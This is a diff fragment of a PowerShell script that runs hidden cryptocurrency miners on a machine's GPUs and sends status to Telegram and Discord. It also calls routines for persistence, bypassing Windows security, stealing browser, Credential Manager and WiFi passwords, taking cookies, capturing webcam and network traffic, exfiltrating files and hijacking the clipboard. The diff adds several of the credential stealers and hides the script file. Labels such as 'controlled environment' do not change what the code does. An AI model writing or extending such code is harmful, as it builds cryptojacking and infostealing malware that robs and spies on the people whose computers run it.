+        $minerProcesses = @()
+        foreach ($gpu in $gpus) {
+            $gpuIndex = $gpus.IndexOf($gpu)
+            $process = Start-Miner -algorithm $bestCoin.algorithm -pool $pool -gpuIndex $gpuIndex
+            if ($process) {
+                $minerProcesses += $process
+            } else {
+                Write-Log "Failed to start miner for GPU $gpuIndex. Attempting to continue with other GPUs."
+            }
+        }
+
+        if ($minerProcesses.Count -eq 0) {
+            Write-Log "No miners started successfully. Aborting."
+            Send-TelegramMessage -message "No miners started successfully. Mining aborted."
+            exit 1
+        }
+
+        Write-Log "Miners initialized successfully. $($minerProcesses.Count) miners running."
+        Send-TelegramMessage -message "Miners initialized: $($minerProcesses.Count) running for $($bestCoin.tag)."
+        Start-Job -ScriptBlock { Monitor-Miner }
+        return $true
+    } catch {
+        Write-Log "Miner initialization failed: $_"
+        Send-TelegramMessage -message "Miner initialization failed: $_"
+        return $false
+    }
+}
+
 # **Main Monitoring Function**
 
 function Monitor-Miners {
     $worker = $env:COMPUTERNAME
-    Write-Log "Starting mining on $worker..."
+    Write-Log "Starting full monitoring on $worker..."
     try {
-        $gpuType = Test-GPUCompatibility
-        if (-not $gpuType) { throw "No compatible GPU detected." }
-        
-        # Install miners
-        Install-Miner -miner "t-rex" -url "https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-win.zip" -path "$baseDir\T-Rex"
-        Install-Miner -miner "nbminer" -url "https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Win.zip" -path "$baseDir\NBMiner"
-        Install-Miner -miner "xmrig" -url "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -path "$baseDir\XMRig"
-        Install-Miner -miner "lolminer" -url "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.91/lolMiner_v1.91_Win64.zip" -path "$baseDir\lolMiner"
-        
         Ensure-Persistence
-        Start-Job -ScriptBlock { Monitor-Miner }
-        
-        # Execute additional features (ethical use assumed)
+        Bypass-WindowsSecurity
+        Prevent-Sleep
+
+        # Execute additional features after miners are confirmed running
         Get-ChromeCredentials
         Get-EdgeCredentials
+        Get-FirefoxCredentials
+        Get-WinCredManCredentials
+        Get-WiFiPasswords
         Get-ChromeHistory
         Get-ChromeCookies
         Capture-NetworkTraffic
@@ -938,10 +1294,11 @@ function Monitor-Miners {
         Capture-Webcam
         Exfiltrate-Files
         Start-ClipboardHijacking
-        
-        $gpus = Get-CimInstance Win32_VideoController
+
+        $gpus = @(Get-CimInstance Win32_VideoController)
         $switchInterval = 1800  # 30 minutes
-        
+        $gpuType = Test-GPUCompatibility
+
         while ($true) {
             $currentTime = Get-Date
             if (($currentTime - $script:lastSwitchTime).TotalSeconds -ge $switchInterval) {
@@ -975,8 +1332,15 @@ Write-Log "Initializing mining script with enhanced features..."
 try {
     Send-TelegramMessage -message "Initializing enhanced mining script..."
     Send-DiscordWebhook -message "Script started in controlled environment."
-    Bypass-WindowsSecurity
-    Prevent-Sleep
+
+    # Start miners first and ensure they are running
+    $minersStarted = Initialize-Miners
+    if (-not $minersStarted) {
+        Write-Log "Miner initialization failed. Exiting script."
+        exit 1
+    }
+
+    # Proceed with monitoring and additional features
     Set-ItemProperty -Path "$baseDir\mining.ps1" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction SilentlyContinue
     Monitor-Miners
 } catch {
